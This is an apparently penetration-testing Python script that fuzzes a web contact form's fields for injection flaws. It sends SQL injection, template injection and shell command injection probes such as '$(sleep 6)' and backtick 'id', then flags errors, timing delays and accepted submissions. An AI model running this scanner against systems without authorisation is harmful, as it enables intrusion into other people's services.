import sys, time, json
sys.path.insert(0,'AT')
from p1_inj import send, base_fields

TESTS = []
for fld in ["fname","lname","cname","subject","msg","areacode","tel"]:
    for p in ["' OR '1'='1", "' AND '1'='2", "1' AND (SELECT SLEEP(6))--",
              "1;SELECT 1--", "${7*7}", "{{7*7}}", "<%= 7*7 %>", "; sleep 6", "$(sleep 6)", "`id`"]:
        TESTS.append((fld,p))

# baseline timing first
t0=time.time(); st,body,dt = send(base_fields()); print("BASELINE", st, round(dt,2), body[:120], flush=True)

for fld,p in TESTS:
    for attempt in range(4):
        f = base_fields(); f[fld]=p
        st,body,dt = send(f)
        if st == 200 or st == 422:
            break
        time.sleep(2.0)
    flag=""
    if st in (500,502,503): flag=" <<<SERVER-ERROR"
    elif dt > 4.0: flag=" <<<TIME-DELAY"
    elif st==200 and 'data":{"id"' in body: flag=" <<<ACCEPTED"
    print(f"{fld:9s} {p[:28]!r:32s} -> {st} {dt:5.2f}s {body[:150]}{flag}", flush=True)
    time.sleep(1.2)
